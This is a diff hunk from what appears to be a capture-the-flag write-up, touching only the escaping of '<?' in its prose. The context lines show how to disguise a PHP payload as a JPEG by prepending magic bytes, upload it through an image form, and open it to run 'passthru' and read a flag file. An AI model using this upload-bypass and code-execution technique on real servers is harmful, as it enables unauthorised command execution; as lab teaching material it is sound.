@@ -8,4 +8,4 @@ $ echo "FF D8 FF E0" | xxd -r -p >> sol.php # xxd converts the string into hex
 $ echo "<?php passthru('cat ../../flag.txt'); ?>" >> sol.php
 ```
 
-This file will still correctly execute PHP because PHP files only execute code that is between the <code><?</code> and <code>?></code>. You can upload this file in the form then right click on the broken image icon to open in a new tab, which executes the PHP and displays the flag.
+This file will still correctly execute PHP because PHP files only execute code that is between the <code>\<?</code> and <code>?></code>. You can upload this file in the form then right click on the broken image icon to open in a new tab, which executes the PHP and displays the flag.
